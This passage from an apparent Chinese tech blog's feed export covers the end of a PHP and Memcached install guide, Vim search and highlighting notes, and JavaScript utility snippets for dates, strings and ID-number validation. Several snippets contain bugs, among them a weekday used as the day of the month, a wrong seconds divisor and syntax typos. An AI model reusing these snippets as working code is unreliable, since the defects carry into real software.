&#21487;&#33021;&#22312;make&#30340;&#26102;&#20505;&#65292;&#20250;&#36935;&#21040;&#38169;&#35823; &#38169;&#35823;&#65306;&#8216;PHP_FE_END&#8217;&#26410;&#22768;&#26126;(&#19981;&#22312;&#20989;&#25968;&#20869;) -----{error: &#8216;PHP_FE_END&#8217; undeclared here (not in a function)} &#35299;&#20915;&#26041;&#27861;&#65306; &#28304;&#20195;&#30721;&#26377;&#38169;&#35823;&#65292;&#36827;&#20837;php-5.3.18/ext/mcrypt&#30446;&#24405; sed -i 's|PHP_FE_END|{NULL,NULL,NULL}|' ./*.c sed -i 's|ZEND_MOD_END|{NULL,NULL,NULL}|' ./*.c &#20877;&#37325;&#26032;make &amp;&amp; make install&#29305;&#21035;&#25552;&#31034;2&#65306; openssl&#25193;&#23637;&#23433;&#35013;&#65292;&#38656;&#35201;&#23433;&#35013;libssl-dev, $ sudo apt-get install libssl-dev&#29305;&#21035;&#25552;&#31034;3&#65306; openssl&#25193;&#23637;&#23433;&#35013;&#37197;&#32622;&#26102;&#65292;&#20986;&#29616;&#38169;&#35823;&#20449;&#24687;&#65306;cannot find config.m4 &#35299;&#20915;&#65306;mv config0.m4 config.m45.5 php-fpm配置cp /usr/local/php/etc/php-fpm.conf.default etc/php-fpm.confvim /usr/local/php/etc/php-fpm.confcontent:        user=username        group=groupname//开启php-fpm/usr/local/php/sbin/php-fpm start6 Memcache安装指南6.1 服务端安装//安装必须组件$apt-get install libevent-dev或下载libevent-dev源码安装：libevent.org or https://sourceforge.net/projects/levent///下载Memcached网址：http://memcached.org/downloads//安装Memcached$tar zxvf memcached-1.5.4.tar.gz$cd memcached-1.5.4$./configure --prefix=/usr/local/memcached --with-libevent=/usr/local/libevent$make &amp;&amp; make install或通过apt-get命令直接安装：$apt-get install memcached//启动Memcached$/usr/local/memcached/bin/memcached -m 64 -p 11211 -u nobody -vv -d-d表示在后台运行$ps aux |grep memcached6.2 客户端安装6.2.1 第一步，安装libmemcached库//下载libmemcached网址：https://launchpad.net///解压安装$tar zxvf libmemcached-1.0.18.tar.gz$cd libmemcached-1.0.18$./configure --prefix=/usr/local/libmemcached#make &amp;&amp; make install6.2.2 第二步，安装PHP memcache、memcached扩展### memcache 扩展$git clone https://github.com/websupport-sk/pecl-memcache memcache$cd memcache$/usr/local/php7/bin/phpize$./configure --with-php-config=/usr/local/php7/bin/php-config#make &amp;&amp; make install//编辑php.ini文件，加入：extension=memcache.so//重启Apache，查看memcache扩展是否加载### memcached 扩展$git clone https;//github.com/php-memcached-dev/php-memcached.git$cd php-memcached$git checkout php7 //进入php7分支$/usr/local/php7/bin/phpize$./configure --with-php-config=/usr/local/php7/bin/php-config \--with-libmemcached-dir=/usr/local/libmemcached--disable-memcached-sasl//同样，编辑PHP配置文件，加入：extension=memcached.so//重启Apache，查看memcached扩展是否加载6.3 参考资料memcache官网：http://memcache.org/Linux Memcached 安装：http://www.runoob.com/memcached/memcached-install.htmllinux下安装PHP memcached扩展：http://www.cnblogs.com/flywind/p/6021568.html编译安装Memcached勾结php7：https://www.jianshu.com/p/c7e59afabc28PHP7 下安装 memcache 和 memcached 扩展：http://www.lnmp.cn/install-memcache-and-memcached-extends-under-php7.htmlLinux下的Memcache安装：http://kimi.it/257.htmlMemcache基础教程：http://kimi.it/259.html7 再次声明&#30001;&#20110;&#27599;&#21488;&#26426;&#22120;&#23433;&#35013;&#30340;&#31995;&#32479;&#24182;&#38750;&#23436;&#20840;&#19968;&#26679;&#65292;&#23433;&#35013;&#31995;&#32479;&#26102;&#33258;&#24102;&#30340;&#21253;&#26377;&#25152;&#24046;&#24322;&#65292;&#25152;&#20197;&#35813;&#25351;&#21335;&#20165;&#20379;&#21442;&#32771;&#12290;&#20851;&#20110;&#35813;&#25351;&#21335;&#65292;&#22914;&#26524;&#20320;&#26377;&#20219;&#20309;&#38382;&#39064;&#65292;&#20320;&#21487;&#20197;&#21457;&#37038;&#20214;&#21040;&#25105;&#30340;&#37038;&#31665;&#65292;&#37038;&#31665;&#22320;&#22336;&#20026; zrg1390556487@gmail.com8 参考资料https://xwsoul.com/posts/684http://php.net/http://www.apache.org/https://www.mysql.com/https://mariadb.org/]]></content>
      <categories>
        
          <category> software </category>
        
          <category> linux </category>
        
      </categories>
      <tags>
        
          <tag> Apache </tag>
        
          <tag> Nginx </tag>
        
          <tag> MySQL </tag>
        
          <tag> PHP </tag>
        
          <tag> PHP-Extension </tag>
        
          <tag> Memcache </tag>
        
          <tag> Redis </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Vim 使用笔记]]></title>
      <url>/software/2015/11/06/using-vim/</url>
      <content type="text"><![CDATA[1 Vim 快捷键Table 1: Vim Keyboard命令描述:set nu!显示行号syntax on语法高亮度显示:set ai!设置自动缩进:100跳到指定行:/word搜索:split分割视窗(可加名称随便开启另一档案)n/N继续搜索下一处/上一处关键词u撤销Ctrl+r恢复gg=GFormart格式化y复制（v模式下）p粘贴顺斜杠:/查找(normal模式下)&#xa0;按下n查找下一个，按下N查找上一个。&#xa0;Vim查找支持正则表达式，例如/vim$匹配行尾的"vim"。 需要查找特殊字符需要转义，例如/vim\\(匹配"vim\)"。&#xa0;注意：查找回车应当用\n，而替换为回车应当用\r（相当于&lt;CR&gt;）。&#xa0;\c表示大小写不敏感查找，\C表示大小写敏感查找。&#xa0;*即可查找光标所在单词（word）， 要求每次出现的前后为空白字符或标点符号。例如当前为foo， 可以匹配foo bar中的foo，但不可匹配foobar中的foo。&#xa0;g*即可查找光标所在单词的字符序列，每次出现前后字符无要求。 即foo bar和foobar中的foo均可被匹配到。:s（substitute）查找和替换。语法如下：&#xa0;:{作用范围}s/{目标}/{替换}/{替换标志}&#xa0;例如:%s/foo/bar/g会在全局范围(%)查找foo并替换为bar，所有出现都会被替换（g）。&#xa0;1. 作用范围分为当前行、全文、选区等等。&#xa0;当前行：:s/foo/bar/g。&#xa0;全文：:%s/foo/bar/g。&#xa0;选区，在Visual模式下选择区域后输入:，Vim即可自动补全为 :'&lt;,'&gt;：:'&lt;,'&gt;s/foo/bar/g。&#xa0;2-11行：:5,12s/foo/bar/g&#xa0;当前行.与接下来两行+2：:.,+2s/foo/bar/g&#xa0;2. 替换标志&#xa0;空替换标志表示只替换从光标位置开始，目标的第一次出现：:%s/foo/bar&#xa0;i表示大小写不敏感查找，I表示大小写敏感：&#xa0;:%s/foo/bar/i&#xa0;# 等效于模式中的\c（不敏感）或\C（敏感）&#xa0;:%s/foo\c/bar&#xa0;c表示需要确认，例如全局查找"foo"替换为"bar"并且需要确认：:%s/foo/bar/gc2 高亮设置2.1 高亮颜色设置可以在 ~/.vimrc 中进行设置：highlight Search ctermbg=yellow ctermfg=black highlight IncSearch ctermbg=black ctermfg=yellow highlight MatchParen cterm=underline ctermbg=NONE ctermfg=NONE上述配置指定 Search 结果的前景色（foreground）为黑色，背景色（background）为灰色； 渐进搜索的前景色为黑色，背景色为黄色；光标处的字符加下划线。2.2 禁用/启用高亮// 禁用所有高亮:nohighlight 或 :nohl//只禁用搜索高亮:set nohlsearch//下次搜索时，需再次启动搜索高亮:set hlsearch延时禁用让Vim查找/替换后一段时间自动取消高亮，发生查找时自动开启呢？1: " &#24403;&#20809;&#26631;&#19968;&#27573;&#26102;&#38388;&#20445;&#25345;&#19981;&#21160;&#20102;&#65292;&#23601;&#31105;&#29992;&#39640;&#20142;2: autocmd cursorhold * set nohlsearch3: " &#24403;&#36755;&#20837;&#26597;&#25214;&#21629;&#20196;&#26102;&#65292;&#20877;&#21551;&#29992;&#39640;&#20142;4: noremap n :set hlsearch&lt;cr&gt;n5: noremap N :set hlsearch&lt;cr&gt;N6: noremap / :set hlsearch&lt;cr&gt;/7: noremap ? :set hlsearch&lt;cr&gt;?8: noremap * *:set hlsearch&lt;cr&gt;一键禁用设置快捷键来一键禁用/开启搜索高亮：nnoremap &lt;c-h&gt; :call DisableHighlight()&lt;cr&gt;function! DisableHighlight()      set nohlsearchendfunc希望关闭高亮时只需要按下 Ctrl+H，当发生下次搜索时又会自动启用。设置生效Notice: 设置完成后，发现功能没有起作用，检查一下系统下是否安装了vim-enhanced包，查询命令为： $ rpm -q vim-enhanced3 References在 Vim 中优雅地查找和替换]]></content>
      <categories>
        
          <category> software </category>
        
      </categories>
      <tags>
        
          <tag> VIM </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[JavaScript 公共文件]]></title>
      <url>/javascript/2015/10/15/js-public/</url>
      <content type="text"><![CDATA[1 写在前面这是关于web开发可能会用到的javascript代码片段，也许能够帮助到你。1.0.1 JavaScript没有块级作用域在其他类C的语言中，由{}封闭的代码块都有自己的作用域（如果用ECMAScript的话来讲，就是它们自己的执行环境）。                                           if(true){                                                                                                                                                 var color="blue";                                                                                                                                 }                                                                                                                                                     alert(color); //"blue"                                                                                                                                内容源于：《JavaScript高级程序设计》第3版 [美] Nicholas C.Zakas，p76.2 日期/时间2.0.1 转换UTC时间function ConvertUtcTime(utctime, style) {    if (utctime == null || utctime == "") {        return "";    }else {        var d = utctime.substring(6, utctime.length - 1);        var newdate = new Date(parseInt(d));        if (style == null || style == "") style = "yyyy-MM-dd hh:mm:ss";        return newdate.format(style);    }}2.0.2 将日期转换为yyyymmddhhssmm格式function getDate(date) {    var year = date.getFullYear();    var month = date.getMonth() + 1;    var date1 = date.getDate();    var day = date.getDay();    var hours = date.getHours();    var minutes = date.getMinutes();    var seconds = date.getSeconds();    var ms = date.getMilliseconds();    var curDateTime = year;    if (month &gt; 9) {        curDateTime = curDateTime + month;    } else {        curDateTime = curDateTime + "0" + month;    }    if (day &gt; 9) {        curDateTime = curDateTime + day;    } else {        curDateTime = curDateTime + "0" + day;    }    if (hours &gt; 9) {        curDateTime = curDateTime + "" + hours;    } else {        curDateTime = curDateTime + "0" + hours;    }    if (minutes &gt; 9) {        curDateTime = curDateTime + minutes;    } else {        curDateTime = curDateTime + "0" + minutes;    }    if (seconds &gt; 9) {        curDateTime = curDateTime + seconds;    } else {        curDateTime = curDateTime + "0" + seconds;    }    return curDateTime;}2.0.3 格式化日期Date.prototype.format = function (format) {    var o =    {        "M+": this.getMonth() + 1, //month        "d+": this.getDate(),    //day        "h+": this.getHours(),   //hour        "m+": this.getMinutes(), //minute        "s+": this.getSeconds(), //second        "q+": Math.floor((this.getMonth() + 3) / 3),  //quarter        "S": this.getMilliseconds() //millisecond    }    if (/(y+)/.test(format))        format = format.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));    for (var k in o)        if (new RegExp("(" + k + ")").test(format))            format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : ("00" + o[k]).substr(("" + o[k]).length));    return format;}2.0.4 日期加减function DateAdd(dateObj, days) {    var tempDate = dateObj.valueOf();    tempDate = tempDate + days * 24 * 60 * 60 * 1000    tempDate = new Date(tempDate)    return tempDate;}2.0.5 获取指定日期//&#33719;&#21462;&#25351;&#23450;&#26085;&#26399;&#24320;&#22987;&#26102;&#38388;&#65288;00&#65306;00&#65306;00&#65289;function getTodayStart(date) {    var y = date.getFullYear();    var m = date.getMonth() + 1;    var d = date.getDate();    var time = y + '-' + (m &lt; 10 ? ('0' + m) : m) + '-' + (d &lt; 10 ? ('0' + d) : d) + " 00:00:00";    return time;}//&#33719;&#21462;&#25351;&#23450;&#26085;&#26399;&#32467;&#26463;&#26102;&#38388;&#65288;00&#65306;00&#65306;00&#65289;function getTodayEnd(date) {    var y = date.getFullYear();    var m = date.getMonth() + 1;    var d = date.getDate();    var time = y + '-' + (m &lt; 10 ? ('0' + m) : m) + '-' + (d &lt; 10 ? ('0' + d) : d) + " 23:59:59";    return time;}//&#33719;&#21462;&#25351;&#23450;&#24403;&#26376;&#31532;&#19968;&#22825;&#26085;&#26399;function getMonthStart(date) {    var y = date.getFullYear();    var m = date.getMonth() + 1;    //var d = date.getDate();    var time = y + '-' + (m &lt; 10 ? ('0' + m) : m) + '-' + 1;    return time;}//&#33719;&#21462;&#25351;&#23450;&#24403;&#22825;&#26085;&#26399;function getMonthEnd(date) {    var y = date.getFullYear();    var m = date.getMonth() + 1;    var d = date.getDate();    var time = y + '-' + (m &lt; 10 ? ('0' + m) : m) + '-' + (d &lt; 10 ? ('0' + d) : d);    return time;}//&#33719;&#21462;&#26376;&#20221;&#26368;&#21518;&#19968;&#22825;function getCurrentMonthLast(date) {    var currentMonth = date.getMonth();    var nextMonth = ++currentMonth;    var nextMonthFirstDay = new Date(date.getFullYear(), nextMonth, 1);    var oneDay = 1000 * 60 * 60 * 24;    return new Date(nextMonthFirstDay - oneDay);}2.0.6 计算日期差function getDateDiff(date1, date2) {    var times = date2 - date1;    var days = Math.floor(times / (1000 * 60 * 60 * 24));    times = times - days * 1000 * 60 * 60 * 24;    var hours = Math.floor(times / (1000 * 60 * 60));    times = times - hours * 1000 * 60 * 60;    var minus = Math.floor(times / 60000);    times = times - minus * 60000;    var secs = Math.floor(times / 6000);    var ret = "";    if (days &gt; 0) {        ret = days + "&#22825;" + hours + "&#26102;" + minus + "&#20998;" + secs + "&#31186;";    }    else {        if (hours &gt; 0) ret = hours + "&#26102;";        ret = ret + minus + "&#20998;" + secs + "&#31186;";    }    return ret;}2.0.7 倒计时&lt;strong&gt;剩余时间：&lt;/strong&gt;&lt;span id="timer"&gt;&lt;/span&gt;//&#20498;&#35745;&#26102; startvar time_end,time_now_server,time_now_client,time_end,time_server_client,timerID;//&#25130;&#27490;&#26102;&#38388;time_end = new Date('{$appraisal_points.stop_time|date="Y-m-d H:i:s",###}');time_end=time_end.getTime();//&#24403;&#21069;&#26102;&#38388;time_now_server=new Date();time_now_server=time_now_server.getTime();time_now_client=new Date();time_now_client=time_now_client.getTime();time_server_client=time_now_server-time_now_client;setTimeout("show_time()",1000);//&#26174;&#31034;&#26102;&#38388;&#20989;&#25968;function show_time(){    Var timer = document.getElementById("timer");    if(!timer){        return ;    }    timer.innerHTML =time_server_client;    var time_now,time_distance,str_time;    var int_day,int_hour,int_minute,int_second;    var time_now=new Date();    time_now=time_now.getTime()+time_server_client;    time_distance=time_end-time_now;    if(time_distance&gt;0)    {        int_day=Math.floor(time_distance/86400000);        time_distance-=int_day*86400000;        int_hour=Math.floor(time_distance/3600000);        time_distance-=int_hour*3600000;        int_minute=Math.floor(time_distance/60000);        time_distance-=int_minute*60000;        int_second=Math.floor(time_distance/1000);        if(int_hour&lt;10){            int_hour="0"+int_hour;        }        if(int_minute&lt;10){            int_minute="0"+int_minute;        }        if(int_second&lt;10){            int_second="0"+int_second;        }        if (int_day&gt;0) {            str_time="&lt;b style='color:#46be8a;'&gt;"+int_day+"&lt;/b style='color:#46be8a;'&gt;&#22825;&lt;b style='color:#46be8a;'&gt;"+int_hour+"&lt;/b style='color:#46be8a;'&gt;&#23567;&#26102;&lt;b style='color:#46be8a;'&gt;"+int_minute+"&lt;/b style='color:#46be8a;'&gt;&#20998;&#38047;&lt;b style='color:#46be8a;'&gt;"+int_second+"&lt;/b style='color:#46be8a;'&gt;&#31186;";        }else if(int_day == 0 &amp;&amp; int_hour&gt;=12){            str_time="&lt;b style='color:#f5a751;'&gt;"+int_day+"&lt;/b style='color:#f5a751;'&gt;&#22825;&lt;b style='color:#f5a751;'&gt;"+int_hour+"&lt;/b style='color:#f5a751;'&gt;&#23567;&#26102;&lt;b style='color:#f5a751;'&gt;"+int_minute+"&lt;/b style='color:#f5a751;'&gt;&#20998;&#38047;&lt;b style='color:#f5a751;'&gt;"+int_second+"&lt;/b style='color:#f5a751;'&gt;&#31186;";        }else if(int_day == 0 &amp;&amp; int_hour&lt;=5){            str_time="&lt;b style='color:#fc6167;'&gt;"+int_day+"&lt;/b style='color:#fc6167;'&gt;&#22825;&lt;b style='color:#fc6167;'&gt;"+int_hour+"&lt;/b style='color:#fc6167;'&gt;&#23567;&#26102;&lt;b style='color:#fc6167;'&gt;"+int_minute+"&lt;/b style='color:#fc6167;'&gt;&#20998;&#38047;&lt;b style='color:#fc6167;'&gt;"+int_second+"&lt;/b style='color:#fc6167;'&gt;&#31186;";        }        timer.innerHTML=str_time;        setTimeout("show_time()",1000);    }    else    {        timer.innerHTML =timer.innerHTML;        clearTimeout(timerID);        // window.location.href="http://www.baidu.com";    }}//&#20498;&#35745;&#26102; end2.0.8 指定睡眠时间/** * js&#25351;&#23450;&#30561;&#30496;&#26102;&#38271; * @param  {[type]} numberMillis [description] * @return {[type]}              [description] */ function sleep(numberMillis) {        var now = new Date();        var exitTime = now.getTime() + numberMillis;        while (true) {                now = new Date();                if (now.getTime() &gt; exitTime)                        return;        }}3 字符串3.1 生成随机验证码function CreateCode() {    var code = '';    var codeLength = 6;//&#39564;&#35777;&#30721;&#30340;&#38271;&#24230;    var selectChar = new Array('1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z');    for (var i = 0; i &lt; codeLength; i++) {        var charIndex = Math.floor(Math.random() * 32);        code += selectChar[charIndex];    }    return code;}3.2 截取字符串包含中文处理//(&#20018;,&#38271;&#24230;,&#22686;&#21152;...) function subString(str, len, hasDot) {    var newLength = 0;    var newStr = "";    var chineseRegex = /[^\x00-\xff]/g;    var singleChar = "";    var strLength = str.replace(chineseRegex, "**").length;    for (var i = 0; i &lt; strLength; i++) {        singleChar = str.charAt(i).toString();        if (singleChar.match(chineseRegex) != null) {            newLength += 2;        }        else {            newLength++;        }        if (newLength &gt; len) {            break;        }        newStr += singleChar;    }    if (hasDot &amp;&amp; strLength &gt; len) {        newStr += "...";    }    return newStr;}3.3 获取url参数function GetRequest() {    var url = location.search; //&#33719;&#21462;url&#20013;"?"&#31526;&#21518;&#30340;&#23383;&#20018;    var theRequest = new Object();    if (url.indexOf("?") != -1) {        var str = url.substr(1);        strs = str.split("&amp;");        for (var i = 0; i &lt; strs.length; i++) {            theRequest[strs[i].split("=")[0]] = unescape(strs[i].split("=")[1]);        }    }    return theRequest;}4 数组5 对象5.1 对象(Object) ⇋ 字符串(String)// Object to Stringvar str=JSON.stringify(obj);// JSON String to Objectvar obj = JSON.parse(str);5.2 判断对象/数组中key是否存在if(obj.hasOwnProperty(key)){...}6 校验6.1 检查对象是否为空对象/*  * &#26816;&#27979;&#23545;&#35937;&#26159;&#21542;&#26159;&#31354;&#23545;&#35937;(&#19981;&#21253;&#21547;&#20219;&#20309;&#21487;&#35835;&#23646;&#24615;)&#12290; //&#22914;&#20320;&#19978;&#38754;&#30340;&#37027;&#20010;&#23545;&#35937;&#23601;&#26159;&#19981;&#21547;&#20219;&#20309;&#21487;&#35835;&#23646;&#24615; * &#26041;&#27861;&#21482;&#26082;&#26816;&#27979;&#23545;&#35937;&#26412;&#36523;&#30340;&#23646;&#24615;&#65292;&#19981;&#26816;&#27979;&#20174;&#21407;&#22411;&#32487;&#25215;&#30340;&#23646;&#24615;&#12290;  */function isOwnEmpty(obj) {    for (var name in obj) {        if (obj.hasOwnProperty(name)) {            return false;        }    }    return true;}/*  * &#26816;&#27979;&#23545;&#35937;&#26159;&#21542;&#26159;&#31354;&#23545;&#35937;(&#19981;&#21253;&#21547;&#20219;&#20309;&#21487;&#35835;&#23646;&#24615;)&#12290;  * &#26041;&#27861;&#26082;&#26816;&#27979;&#23545;&#35937;&#26412;&#36523;&#30340;&#23646;&#24615;&#65292;&#20063;&#26816;&#27979;&#20174;&#21407;&#22411;&#32487;&#25215;&#30340;&#23646;&#24615;(&#22240;&#27492;&#27809;&#26377;&#20351;hasOwnProperty)&#12290;  */function isEmpty(obj) {    for (var name in obj) {        return false;    }    return true;}6.2 身份证号校验//检验身份证号码function checkIdcard(idcard) {    var Msgs = new Array(        "&#39564;&#35777;&#36890;&#36807;",        "&#26657;&#39564;&#36523;&#20221;&#35777;&#21495;&#30721;&#20301;&#25968;&#19981;&#23545;&#65292;&#35831;&#27491;&#30830;&#36755;&#20837;&#36523;&#20221;&#35777;&#21495;&#30721;&#12290;",        "&#26657;&#39564;&#20986;&#29983;&#26085;&#26399;&#26080;&#25928;&#65292;&#35831;&#27491;&#30830;&#36755;&#20837;&#30495;&#23454;&#30340;&#36523;&#20221;&#35777;&#21495;&#30721;&#12290;",        "&#26816;&#39564;&#36523;&#20221;&#35777;&#21495;&#30721;&#38169;&#35823;&#65292;&#35831;&#36755;&#20837;&#30495;&#23454;&#30340;&#36523;&#20221;&#35777;&#21495;&#30721;&#12290;",        "&#26657;&#39564;&#36523;&#20221;&#35777;&#30465;&#20221;&#38169;&#35823;&#65292;&#35831;&#36755;&#20837;&#30495;&#23454;&#30340;&#36523;&#20221;&#35777;&#21495;&#30721;&#12290;","&#36523;&#20221;&#35777;&#21495;&#30721;&#19981;&#20801;&#35768;&#20026;&#31354;&#65292;&#35831;&#36755;&#20837;&#30495;&#23454;&#30340;&#36523;&#20221;&#35777;&#21495;&#30721;&#12290;"    );    idcard = idcard.toUpperCase();    var area = { 11: "&#21271;&#20140;", 12: "&#22825;&#27941;", 13: "&#27827;&#21271;", 14: "&#23665;&#35199;", 15: "&#20869;&#33945;&#21476;", 21: "&#36797;&#23425;", 22: "&#21513;&#26519;", 23: "&#40657;&#40857;&#27743;", 31: "&#19978;&#28023;", 32: "&#27743;&#33487;", 33: "&#27993;&#27743;", 34: "&#23433;&#24509;", 35: "&#31119;&#24314;", 36: "&#27743;&#35199;", 37: "&#23665;&#19996;", 41: "&#27827;&#21335;", 42: "&#28246;&#21271;", 43: "&#28246;&#21335;", 44: "&#24191;&#19996;", 45: "&#24191;&#35199;", 46: "&#28023;&#21335;", 50: "&#37325;&#24198;", 51: "&#22235;&#24029;", 52: "&#36149;&#24030;", 53: "&#20113;&#21335;", 54: "&#35199;&#34255;", 61: "&#38485;&#35199;", 62: "&#29976;&#32899;", 63: "&#38738;&#28023;", 64: "&#23425;&#22799;", 65: "&#26032;&#30086;", 71: "&#21488;&#28286;", 81: "&#39321;&#28207;", 82: "&#28595;&#38376;", 91: "&#22269;&#22806;" }    var idcard, Y, JYM;    var S, M;    var idcard_array = new Array();    idcard_array = idcard.split("");    //&#39564;&#35777;&#26159;&#21542;&#20026;&#31354;    if (idcard.length &lt;= 0) {        return Msgs[5];    }    //&#39564;&#35777;&#21495;&#30721;&#20301;&#25968;    if (idcard.length != 15 &amp;&amp; idcard.length != 18) {        return Msgs[1];    }    //&#22320;&#21306;&#26816;&#39564;    if (area[parseInt(idcard.substr(0, 2))] == null) {        return Msgs[4];    }    //&#36523;&#20221;&#21495;&#30721;&#20301;&#25968;&#21450;&#26684;&#24335;&#26816;&#39564;    switch (idcard.length) {        case 15:            if ((parseInt(idcard.substr(6, 2)) + 1900) % 4 == 0 || ((parseInt(idcard.substr(6, 2)) + 1900) % 100 == 0 &amp;&amp; (parseInt(idcard.substr(6, 2)) + 1900) % 4 == 0)) {                ereg = /^[1-9][0-9]{5}[0-9]{2}((01|03|05|07|08|10|12)(0[1-9]|[1-2][0-9]|3[0-1])|(04|06|09|11)(0[1-9]|[1-2][0-9]|30)|02(0[1-9]|[1-2][0-9]))[0-9]{3}$/;//&#27979;&#35797;&#20986;&#29983;&#26085;&#26399;&#30340;&#21512;&#27861;&#24615;            } else {                ereg = /^[1-9][0-9]{5}[0-9]{2}((01|03|05|07|08|10|12)(0[1-9]|[1-2][0-9]|3[0-1])|(04|06|09|11)(0[1-9]|[1-2][0-9]|30)|02(0[1-9]|1[0-9]|2[0-8]))[0-9]{3}$/;//&#27979;&#35797;&#20986;&#29983;&#26085;&#26399;&#30340;&#21512;&#27861;&#24615;            }            if (ereg.test(idcard))                return Msgs[0];            else {                return Msgs[3];            }            break;        case 18:            //18&#20301;&#36523;&#20221;&#21495;&#30721;&#26816;&#27979;            //&#20986;&#29983;&#26085;&#26399;&#30340;&#21512;&#27861;&#24615;&#26816;&#26597;             //&#38384;&#24180;&#26376;&#26085;:((01|03|05|07|08|10|12)(0[1-9]|[1-2][0-9]|3[0-1])|(04|06|09|11)(0[1-9]|[1-2][0-9]|30)|02(0[1-9]|[1-2][0-9]))            //&#24179;&#24180;&#26376;&#26085;:((01|03|05|07|08|10|12)(0[1-9]|[1-2][0-9]|3[0-1])|(04|06|09|11)(0[1-9]|[1-2][0-9]|30)|02(0[1-9]|1[0-9]|2[0-8]))            if (parseInt(idcard.substr(6, 4)) % 4 == 0 || (parseInt(idcard.substr(6, 4)) % 100 == 0 &amp;&amp; parseInt(idcard.substr(6, 4)) % 4 == 0)) {                ereg = /^[1-9][0-9]{5}(19|20)[0-9]{2}((01|03|05|07|08|10|12)(0[1-9]|[1-2][0-9]|3[0-1])|(04|06|09|11)(0[1-9]|[1-2][0-9]|30)|02(0[1-9]|[1-2][0-9]))[0-9]{3}[0-9Xx]$/;//&#38384;&#24180;&#20986;&#29983;&#26085;&#26399;&#30340;&#21512;&#27861;&#24615;&#27491;&#21017;&#34920;&#36798;&#24335;            } else {                ereg = /^[1-9][0-9]{5}(19|20)[0-9]{2}((01|03|05|07|08|10|12)(0[1-9]|[1-2][0-9]|3[0-1])|(04|06|09|11)(0[1-9]|[1-2][0-9]|30)|02(0[1-9]|1[0-9]|2[0-8]))[0-9]{3}[0-9Xx]$/;//&#24179;&#24180;&#20986;&#29983;&#26085;&#26399;&#30340;&#21512;&#27861;&#24615;&#27491;&#21017;&#34920;&#36798;&#24335;            }            if (ereg.test(idcard)) {//&#27979;&#35797;&#20986;&#29983;&#26085;&#26399;&#30340;&#21512;&#27861;&#24615;                //&#35745;&#31639;&#26657;&#39564;&#20301;                S = (parseInt(idcard_array[0]) + parseInt(idcard_array[10])) * 7+ (parseInt(idcard_array[1]) + parseInt(idcard_array[11])) * 9+ (parseInt(idcard_array[2]) + parseInt(idcard_array[12])) * 10+ (parseInt(idcard_array[3]) + parseInt(idcard_array[13])) * 5+ (parseInt(idcard_array[4]) + parseInt(idcard_array[14])) * 8+ (parseInt(idcard_array[5]) + parseInt(idcard_array[15])) * 4+ (parseInt(idcard_array[6]) + parseInt(idcard_array[16])) * 2+ parseInt(idcard_array[7]) * 1+ parseInt(idcard_array[8]) * 6+ parseInt(idcard_array[9]) * 3;                Y = S % 11;                M = "F";                JYM = "10X98765432";                M = JYM.substr(Y, 1);//&#21028;&#26029;&#26657;&#39564;&#20301;                if (M == idcard_array[17])                    return Msgs[0];                else {                    return Msgs[3];                }            }            else {                return Msgs[2];            }            break;        default:            return Msgs[1];            break;    }}//身份证号码验证算法//--&#26681;&#25454;17&#20301;&#25968;&#23383;&#26412;&#20307;&#30721;&#33719;&#21462;&#26368;&#21518;&#19968;&#20301;&#26657;&#39564;&#30721;&#31243;&#24207;public class Id18 {    int[] weight={7,9,10,5,8,4,2,1,6,3,7,9,10,5,8,4,2};    //&#21313;&#19971;&#20301;&#25968;&#23383;&#26412;&#20307;&#30721;&#26435;&#37325;    char[] validate={ '1','0','X','9','8','7','6','5','4','3','2'};    //mod11,&#23545;&#24212;&#26657;&#39564;&#30721;&#23383;&#31526;&#20540;        public char getValidateCode(String id17){        int sum = 0;        int mode = 0;        for(int i = 0; i &lt; id17.length(); i++){            sum=sum+Integer.parseInt(String.valueOf(id17.charAt(i)))*weight[i];        }        mode = sum % 11;        return validate[mode];    }    public static void main(String[] args){        Id18 tes t= new Id18();        System.out.println("&#35813;&#36523;&#20221;&#35777;&#39564;&#35777;&#30721;&#65306;"+test.getValidateCode("14230219700101101"));    //&#35813;&#36523;&#20221;&#35777;&#26657;&#39564;&#30721;&#65306;3    }}--&#20844;&#27665;&#36523;&#20221;&#21495;&#30721;&#26159;&#29305;&#24449;&#32452;&#21512;&#30721;&#65292;&#30001;&#21313;&#19971;&#20301;&#25968;&#23383;&#26412;&#20307;&#30721;&#21644;&#19968;&#20301;&#26657;&#39564;&#30721;&#32452;&#25104;&#12290;&#25490;&#21015;&#39034;&#24207;&#20174;&#24038;&#33267;&#21491;&#20381;&#27425;&#20026;&#65306;&#20845;&#20301;&#25968;&#23383;&#22320;&#22336;&#30721;&#65292;&#20843;&#20301;&#25968;&#23383;&#20986;&#29983;&#26085;&#26399;&#30721;&#65292;&#19977;&#20301;&#25968;&#23383;&#39034;&#24207;&#30721;&#21644;&#19968;&#20301;&#26657;&#39564;&#30721;&#12290;1&#12289;&#22320;&#22336;&#30721;&#34920;&#31034;&#32534;&#30721;&#23545;&#35937;&#24120;&#20303;&#25143;&#21475;&#25152;&#22312;&#21439;(&#24066;&#12289;&#26071;&#12289;&#21306;)&#30340;&#34892;&#25919;&#21306;&#22495;&#21010;&#20998;&#20195;&#30721;&#65292;&#25353;GB/T2260&#30340;&#35268;&#23450;&#25191;&#34892;&#12290;2&#12289;&#20986;&#29983;&#26085;&#26399;&#30721;&#34920;&#31034;&#32534;&#30721;&#23545;&#35937;&#20986;&#29983;&#30340;&#24180;&#12289;&#26376;&#12289;&#26085;&#65292;&#25353;GB/T7408&#30340;&#35268;&#23450;&#25191;&#34892;&#65292;&#24180;&#12289;&#26376;&#12289;&#26085;&#20195;&#30721;&#20043;&#38388;&#19981;&#29992;&#20998;&#38548;&#31526;&#12290;3&#12289;&#39034;&#24207;&#30721;&#34920;&#31034;&#22312;&#21516;&#19968;&#22320;&#22336;&#30721;&#25152;&#26631;&#35782;&#30340;&#21306;&#22495;&#33539;&#22260;&#20869;&#65292;&#23545;&#21516;&#24180;&#12289;&#21516;&#26376;&#12289;&#21516;&#26085;&#20986;&#29983;&#30340;&#20154;&#32534;&#23450;&#30340;&#39034;&#24207;&#21495;&#65292;&#39034;&#24207;&#30721;&#30340;&#22855;&#25968;&#20998;&#37197;&#32473;&#30007;&#24615;&#